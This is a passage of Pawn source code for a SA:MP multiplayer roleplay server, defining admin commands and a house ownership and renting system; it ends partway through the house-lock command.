CMD:cnnn(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new
			iTextID,
			szMessage[128];

		if(sscanf(params, "is[128]", iTextID, szMessage)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /cnnn [type 1-6] [message]. ~n~ = new line, ~r~ = red, ~g~ = green, ~b~ = blue, ~w~ = white, ~y~ = yellow.");
		}
		else if(!(0 <= iTextID <= 6 && iTextID != 2)) {
			SendClientMessage(playerid, COLOR_GRAD2, "Text ID must be between 0 and 6, but not 2 (due to SA:MP bugs).");
		}
		else foreach(Player, i) GameTextForPlayer(i, szMessage, 5000, iTextID);
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:motd(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 6)
    {
  		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /motd [message]");
		new string[128];
    	format(string, sizeof(string), "AdmCmd: %s has changed the Global MOTD to '%s'.", GetPlayerNameEx(playerid), params);
		ABroadCast(COLOR_LIGHTRED, string, 5);
		format(GlobalMOTD, sizeof(GlobalMOTD), "%s", params);
		SendClientMessage(playerid, COLOR_WHITE, "You've adjusted the Global MOTD.");

		format(string, sizeof(string), "News: %s", params);
		TextDrawSetString(MainMenuTxtdraw[6], string);

		Misc_Save();
	}
	return 1;
}

CMD:amotd(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 5)
    {
		if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /amotd [message]");
		new string[128];
		format(AdminMOTD, sizeof(AdminMOTD), "%s", params);
		format(string, sizeof(string), "AdmCmd: %s has changed the Admin MOTD to '%s'.", GetPlayerNameEx(playerid), params);
		ABroadCast(COLOR_LIGHTRED, string, 5);
		SendClientMessage(playerid, COLOR_WHITE, "You've adjusted the Admin MOTD.");
		Misc_Save();
	}
	return 1;
}

CMD:paused(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

    	new
			szMessage[42 + MAX_PLAYER_NAME];

	    SendClientMessage(playerid,COLOR_WHITE,"Listing all paused players...");
	    foreach(Player, i) if(playerTabbed[i] != 0) {
			if(playerTabbedTime[i] > 60) format(szMessage, sizeof(szMessage), "* %s (ID %d), tabbed for %d minutes.", GetPlayerNameEx(i), i, playerTabbedTime[i] / 60);
			else format(szMessage, sizeof(szMessage), "* %s (ID %d), tabbed for %d seconds.", GetPlayerNameEx(i), i, playerTabbedTime[i]);

			if(PlayerInfo[i][pAdmin] >= 2) SendClientMessage(playerid,COLOR_WHITE, szMessage);
			else SendClientMessage(playerid,COLOR_GREY, szMessage);
  		}
   	}
    else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use this command.");
	return 1;
}

CMD:afk(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

    	new
			szMessage[36 + MAX_PLAYER_NAME];

	    SendClientMessage(playerid,COLOR_WHITE,"Listing all AFK players...");
	    foreach(Player, i) if(playerAFK[i] != 0 && playerAFKTime[i] > 60) {
			format(szMessage,sizeof(szMessage),"* %s (ID %d), AFK for %d minutes.", GetPlayerNameEx(i), i, playerAFKTime[i] / 60);
			if(PlayerInfo[i][pAdmin] >= 2) SendClientMessage(playerid,COLOR_RED,szMessage);
			else SendClientMessage(playerid,COLOR_GREY,szMessage);
  		}
   	}
    else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use this command.");
	return 1;
}

CMD:gotoco(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new Float: pos[3], int;
		if(sscanf(params, "fffd", pos[0], pos[1], pos[2], int)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /gotoco [x coordinate] [y coordinate] [z coordinate] [interior]");

		SendClientMessage(playerid, COLOR_GRAD2, "You have been teleported to the coordinates specified.");
		SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		SetPlayerInterior(playerid, int);
	}
	return 1;
}

CMD:check(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		new giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /check [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			ShowStats(playerid,giveplayerid);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:ocheck(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ocheck [name]");

	new
		giveplayerid = ReturnUser(params);

	if(IsPlayerConnected(giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "That player is online, please use /check instead.");

	new
		szPlayerName[MAX_PLAYER_NAME],
	    szQuery[68];

	mysql_escape_string(params, szPlayerName,MAX_PLAYER_NAME,sqldb);
	mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT * FROM players WHERE Username = '%s'", szPlayerName);
	mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_GET_STATS, playerid);
	return 1;
}

CMD:okills(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /okills [name]");

	new
		giveplayerid = ReturnUser(params);

	if(IsPlayerConnected(giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "That player is online, please use /kills instead.");

	new
		szPlayerName[MAX_PLAYER_NAME],
	    szQuery[68];

	mysql_escape_string(params, szPlayerName,MAX_PLAYER_NAME,sqldb);
	mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT * FROM players WHERE Username = '%s'", szPlayerName);
	mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_OFFLINE_KILLS,playerid);
	return 1;
}


CMD:househelp(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    SendClientMessage(playerid, COLOR_WHITE,"*** HOUSE HELP *** - type a command for more infomation.");
    SendClientMessage(playerid, COLOR_GRAD3,"*** HOUSE *** /houselock /setrentable /setrent /evict /evictall /sellhouse /sellmyhouse /ringbell /renters");
    SendClientMessage(playerid, COLOR_GRAD3,"*** HOUSE *** /hwithdraw /hdeposit /hbalance /getgun /storegun /houseinvite /housekeys /givehousekeys /takehousekeys");
    return 1;
}

CMD:renthelp(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    SendClientMessage(playerid, COLOR_WHITE,"*** RENTING HELP *** - type a command for more infomation.");
    SendClientMessage(playerid, COLOR_GRAD3,"*** RENT *** /unrent /enter /exit /renters");
    return 1;
}

CMD:renters(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "You don't own a house.");

	new
		szMessage[128],
		count;

	SendClientMessage(playerid, COLOR_GREEN, "--------------------- [ House Renters ] ---------------------");
	foreach(Player, i) {
		if(PlayerInfo[playerid][pHouse] == PlayerInfo[i][pRenting] && PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID) {
			format(szMessage, sizeof(szMessage), "House 1 | %s (%i)", GetPlayerNameEx(i), i);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			count++;
		} else if(PlayerInfo[playerid][pHouse2] == PlayerInfo[i][pRenting] && PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID) {
			format(szMessage, sizeof(szMessage), "House 2 | %s (%i)", GetPlayerNameEx(i), i);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			count++;
		}
	}
	if(count == 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Nobody is renting your house.");
    return 1;
}

CMD:hnext(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		SendClientMessage(playerid, COLOR_RED, "* Listing next available house...");
		for(new x;x<MAX_HOUSES;x++)
		{
		    if(HouseInfo[x][hOwned] == 0)
		    {
		        new string[128];
		        format(string, sizeof(string), "%d is available to use.", x);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        break;
			}
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
		return 1;
	}
	return 1;
}

CMD:goinhouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new housenum;
		if(sscanf(params, "d", housenum)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /goinhouse [housenumber]");

		SetPlayerInterior(playerid,HouseInfo[housenum][hHInteriorWorld]);
		if(HouseInfo[housenum][hCustomInterior] == 1)
		{
			LoadObjectsForPlayer(playerid);
		}
		SetPlayerPos(playerid,HouseInfo[housenum][hInteriorX],HouseInfo[housenum][hInteriorY],HouseInfo[housenum][hInteriorZ]);
		GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
		PlayerInfo[playerid][pInt] = HouseInfo[housenum][hHInteriorWorld];
		PlayerInfo[playerid][pVW] = housenum+60000;
		SetPlayerVirtualWorld(playerid, housenum+60000);
	}
	return 1;
}

CMD:gotohouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new housenum;
		if(sscanf(params, "d", housenum)) return SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /gotohouse [housenumber]");

		SetPlayerPos(playerid,HouseInfo[housenum][hExteriorX],HouseInfo[housenum][hExteriorY],HouseInfo[housenum][hExteriorZ]);
		GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
	}
	return 1;
}

CMD:hedit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
 	}

	new string[128], choice[32], houseid, amount;
	if(sscanf(params, "s[32]dD", choice, houseid, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /hedit [name] [houseid] [(Optional)amount]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Exterior, Interior, CustomInterior, CustomExterior, Level, Price");
		return 1;
	}

	if(strcmp(choice, "interior", true) == 0)
	{
		GetPlayerPos(playerid, HouseInfo[houseid][hInteriorX], HouseInfo[houseid][hInteriorY], HouseInfo[houseid][hInteriorZ]);
		GetPlayerFacingAngle(playerid, HouseInfo[houseid][hInteriorA]);
		HouseInfo[houseid][hHInteriorWorld] = GetPlayerInterior(playerid);
		SendClientMessage(playerid, COLOR_WHITE, "You have changed the interior!");
		SaveHouses();

		format(string, sizeof(string), "%s has edited HouseID %d's Interior.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "custominterior", true) == 0)
	{
		if(HouseInfo[houseid][hCustomInterior] == 0)
		{
			HouseInfo[houseid][hCustomInterior] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "House set to custom interior!");
		}
		else
		{
			HouseInfo[houseid][hCustomInterior] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "House set to normal (not custom) interior!");
		}
		SaveHouses();

		format(string, sizeof(string), "%s has edited HouseID %d's Custom Interior.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "customexterior", true) == 0)
	{
		if(HouseInfo[houseid][hCustomExterior] == 0)
		{
			HouseInfo[houseid][hCustomExterior] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "House set to custom exterior!");
		}
		else
		{
			HouseInfo[houseid][hCustomExterior] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "House set to normal (not custom) exterior!");
		}
		SaveHouses();

		format(string, sizeof(string), "%s has edited HouseID %d's Custom Exterior.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "exterior", true) == 0)
	{
		GetPlayerPos(playerid, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]);
		GetPlayerFacingAngle(playerid, HouseInfo[houseid][hExteriorA]);
		SendClientMessage(playerid, COLOR_WHITE, "You have changed the exterior!");
		DestroyPickup(HouseInfo[houseid][hPickupID]);
		SaveHouses();

		format(string, sizeof(string), "%s has edited HouseID %d's Exterior.", GetPlayerNameEx(playerid), houseid);
		Log("logs/hedit.log", string);
		if(HouseInfo[houseid][hOwned] ==0)
		{
			DestroyPickup(HouseInfo[houseid][hPickupID]);
			DestroyDynamic3DTextLabel(HouseInfo[houseid][hTextID]);
			format(string, sizeof(string), "This house is for sale!\n Level: %d\nID: %d\nPrice: $%d\nTo buy this house type /buyhouse",HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hValue]);
			HouseInfo[houseid][hTextID] = CreateDynamic3DTextLabel(string, COLOR_HOUSEGREEN, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
			HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
		}
		else
		{
			if(HouseInfo[houseid][hRentable] == 0)
			{
				DestroyPickup(HouseInfo[houseid][hPickupID]);
				DestroyDynamic3DTextLabel(HouseInfo[houseid][hTextID]);
				format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid);
				HouseInfo[houseid][hTextID] = CreateDynamic3DTextLabel(string,COLOR_HOUSEGREEN,HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
				HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
			}
			else
			{
				DestroyPickup(HouseInfo[houseid][hPickupID]);
				DestroyDynamic3DTextLabel(HouseInfo[houseid][hTextID]);
				format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d\nRent: $%d\nType /rentroom to rent a room",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hRentFee]);
				HouseInfo[houseid][hTextID] = CreateDynamic3DTextLabel(string,COLOR_HOUSEGREEN,HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
				HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
			}
		}
	}
	else if(strcmp(choice, "level", true) == 0)
	{
		HouseInfo[houseid][hLevel] = amount;
		format(string, sizeof(string), "You have set the house level to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if(HouseInfo[houseid][hOwned] ==0)
		{
			format(string, sizeof(string), "This house is for sale!\n Level: %d\nID: %d\nPrice: $%d\nTo buy this house type /buyhouse",HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hValue]);
			UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
		}
		else
		{
			if(HouseInfo[houseid][hRentable] == 0)
			{
				format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid);
				UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
			}
			else
			{
				format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d\nRent: $%d\nType /rentroom to rent a room",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hRentFee]);
				UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
			}
		}
		format(string, sizeof(string), "%s has edited HouseID %d's Level to %d.", GetPlayerNameEx(playerid), houseid, amount);
		Log("logs/hedit.log", string);
	}
	else if(strcmp(choice, "price", true) == 0)
	{
		HouseInfo[houseid][hValue] = amount;
		format(string, sizeof(string), "You have set the houses price to $%d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if(HouseInfo[houseid][hOwned] ==0)
		{
			format(string, sizeof(string), "This house is for sale!\n Level: %d\nID: %d\nPrice: $%d\nTo buy this house type /buyhouse",HouseInfo[houseid][hLevel],houseid,HouseInfo[houseid][hValue]);
			UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
		}

		format(string, sizeof(string), "%s has edited HouseID %d's Price to $%d.", GetPlayerNameEx(playerid), amount);
		Log("logs/hedit.log", string);
	}
	/*else if(strcmp(choice, "class", true) == 0)
	{
		switch(amount)
		{
		case 1:
			{
				format(HouseInfo[houseid][hDescription], 128, "Low");
				SendClientMessage(playerid, COLOR_WHITE, "You have set the house's class to 1 (Low)");
			}
		case 2:
			{
				format(HouseInfo[houseid][hDescription], 128, "Medium");
				SendClientMessage(playerid, COLOR_WHITE, "You have set the house's class to 2 (Medium)");
			}
		case 3:
			{
				format(HouseInfo[houseid][hDescription], 128, "High");
				SendClientMessage(playerid, COLOR_WHITE, "You have set the house's class to 3 (High)");
			}
		}
		if(HouseInfo[houseid][hOwned] ==0)
		{
			format(string, sizeof(string), "This home is for sale!\n Description: %s\nPrice: $%d\n Level: %d\nID: %d\nTo buy this house type /buyhouse",HouseInfo[houseid][hDescription],HouseInfo[houseid][hValue],HouseInfo[houseid][hLevel],houseid);
			UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);
		}

		format(string, sizeof(string), "%s has edited HouseID %d's Class to %d.", GetPlayerNameEx(playerid), houseid, amount);
		Log("logs/hedit.log", string);
	}*/
	SaveHouses();
	return 1;
}

CMD:hname(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
	}

	new string[128], houseid, ownername[24];
	if(sscanf(params, "ds[24]", houseid, ownername)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /hname [houseid] [name]");

	format(HouseInfo[houseid][hOwner], 24, "%s", ownername);
	format(string, sizeof(string), "You have set the house owner to %s", ownername);
	HouseInfo[houseid][hOwned] = 1;
	HouseInfo[houseid][hRentable] = 0;
	SendClientMessage(playerid, COLOR_WHITE, string);
	DestroyPickup(HouseInfo[houseid][hPickupID]);
	HouseInfo[houseid][hPickupID] = CreatePickup(1273, 23, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ], -1);
	format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[houseid][hOwner],HouseInfo[houseid][hLevel],houseid);
	UpdateDynamic3DTextLabelText(HouseInfo[houseid][hTextID], COLOR_HOUSEGREEN, string);

	format(string, sizeof(string), "%s has edited HouseID %d's Owner to %s.", GetPlayerNameEx(playerid), houseid, ownername);
	Log("logs/hedit.log", string);

	return 1;
}

CMD:edit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6)
	{
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
	}

	new string[128], choice[32], amount;
	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "|__________________ Edit __________________|");
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /edit [name] [amount]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Level, Price");
		SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
		return 1;
	}

	for(new i = 0; i < sizeof(HouseInfo); i++)
	{
		if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]))
		{
			format(string, sizeof(string), "House: %d", i);
			SendClientMessage(playerid, COLOR_GRAD2, string);
			if(amount > 0)
			{
				if(strcmp(choice,"level",true) == 0)
				{
					HouseInfo[i][hLevel] = amount;
				}
				else if(strcmp(choice,"price",true) == 0)
				{
					HouseInfo[i][hValue] = amount;
				}
			}
			if(HouseInfo[i][hOwned] ==0)
			{
				format(string, sizeof(string), "This house is for sale!\n Level: %d\nID: %d\nPrice: $%d\nTo buy this house type /buyhouse",HouseInfo[i][hLevel],i,HouseInfo[i][hValue]);
				UpdateDynamic3DTextLabelText(HouseInfo[i][hTextID], COLOR_HOUSEGREEN, string);
			}
			else
			{
				if(HouseInfo[i][hRentable] == 0)
				{
     				format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[i][hOwner],HouseInfo[i][hLevel],i);
					UpdateDynamic3DTextLabelText(HouseInfo[i][hTextID], COLOR_HOUSEGREEN, string);
				}
				else
				{
     				format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d\nRent: $%d\nType /rentroom to rent a room",HouseInfo[i][hOwner],HouseInfo[i][hLevel],i,HouseInfo[i][hRentFee]);
					UpdateDynamic3DTextLabelText(HouseInfo[i][hTextID], COLOR_HOUSEGREEN, string);
				}
			}
		}
	}
	return 1;
}

CMD:rentroom(playerid, params[])
{
    //new string[128];
    new Float:oldposx, Float:oldposy, Float:oldposz;
    new playername[MAX_PLAYER_NAME];
    GetPlayerName(playerid, playername, sizeof(playername));
    GetPlayerPos(playerid, oldposx, oldposy, oldposz);
    for(new h = 0; h < sizeof(HouseInfo); h++)
	{
        if(IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[h][hExteriorX], HouseInfo[h][hExteriorY], HouseInfo[h][hExteriorZ]) && HouseInfo[h][hRentFee] >= 1)
		{
            if(! strcmp(HouseInfo[h][hOwner], "Nobody", true))
			{
                SendClientMessage(playerid, COLOR_WHITE, "You can't rent an unowned house.");
            }
            else
			{
                if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
				{
                    SendClientMessage(playerid, COLOR_WHITE, "   You already own a house, type /sellhouse if you want to rent this one.");
                    return 1;
                }
                if(GetPlayerCash(playerid) > HouseInfo[h][hRentFee])
				{
                    if(HouseInfo[h][hRentable] == 0)
					{
                        SendClientMessage(playerid, COLOR_WHITE, "This house is not rentable.");
                        return 1;
                    }
                    else
					{
                        PlayerInfo[playerid][pRenting] = h;
                        GivePlayerCash(playerid,-HouseInfo[h][hRentFee]);
                        HouseInfo[h][hSafeMoney] = HouseInfo[h][hSafeMoney]+HouseInfo[h][hRentFee];
                        SetPlayerInterior(playerid,HouseInfo[h][hHInteriorWorld]);
                        if(HouseInfo[h][hCustomInterior] == 1)
						{
                            LoadObjectsForPlayer(playerid);
                        }
                        SetPlayerPos(playerid,HouseInfo[h][hInteriorX],HouseInfo[h][hInteriorY],HouseInfo[h][hInteriorZ]);
                        GameTextForPlayer(playerid, "~w~Welcome Home~n~You can exit at any time by moving to this door and typing /exit.", 5000, 3);
                        PlayerInfo[playerid][pInt] = HouseInfo[h][hHInteriorWorld];
                        PlayerInfo[playerid][pVW] = 60000+h;
                        SetPlayerVirtualWorld(playerid, h+60000);
                        SendClientMessage(playerid, COLOR_WHITE, "Congratulations. You can enter and exit here any time you want.");
                        SendClientMessage(playerid, COLOR_WHITE, "Type /help to review the property help section.");
   						PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
						PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
						GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
						GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
						GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
                        OnPlayerStatsUpdate(playerid);
                        //new ip[32];
                        //GetPlayerIp(playerid,ip,sizeof(ip));
                        //format(string,sizeof(string),"%s (IP: %s) has rented house ID %d (owned by %s) for $%d.",GetPlayerNameEx(playerid),ip,h,HouseInfo[h][hOwner],HouseInfo[h][hRentFee]);
                        //Log("logs/house.log", string);
                        return 1;
                    }
                }
                else
				{
                    SendClientMessage(playerid, COLOR_WHITE, "You don't have the cash for that.");
                    return 1;
                }
            }
        }
    }
    return 1;
}

CMD:unrent(playerid, params[])
{
    new playername[MAX_PLAYER_NAME];
    GetPlayerName(playerid, playername, sizeof(playername));
    if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
	{
        SendClientMessage(playerid, COLOR_WHITE, "   You own this house!");
        return 1;
    }
    if(PlayerInfo[playerid][pRenting] != INVALID_HOUSE_ID)
	{
        PlayerInfo[playerid][pRenting] = INVALID_HOUSE_ID;
        SendClientMessage(playerid, COLOR_WHITE, "You're now homeless.");
    }
    return 1;
}

CMD:houselock(playerid, params[]) {
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorZ]))) {

		new
			szMessage[30 + MAX_PLAYER_NAME];

		if(HouseInfo[PlayerInfo[playerid][pHouse]][hLock] == 1)
		{
			HouseInfo[PlayerInfo[playerid][pHouse]][hLock] = 0;
			format(szMessage, sizeof(szMessage), "* %s has unlocked their house.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
